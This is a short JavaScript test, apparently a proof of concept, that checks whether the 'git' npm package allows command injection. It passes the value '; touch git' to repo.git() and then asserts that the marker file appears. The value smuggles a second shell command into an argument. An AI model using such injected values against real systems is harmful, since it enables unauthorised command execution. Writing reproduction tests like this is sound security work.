//checking that its not present already
test("Remote code execution in git", () => {
  const Git = require("git").Git;
  const fs = require("fs");
  const path = "./git";
  const sleep = require("sleep");
  let repo = new Git("repo-test");
  let user_input = "; touch git";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    repo.git(user_input, function (err, result) {});
  } catch (error) {}
  sleep.sleep(3);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
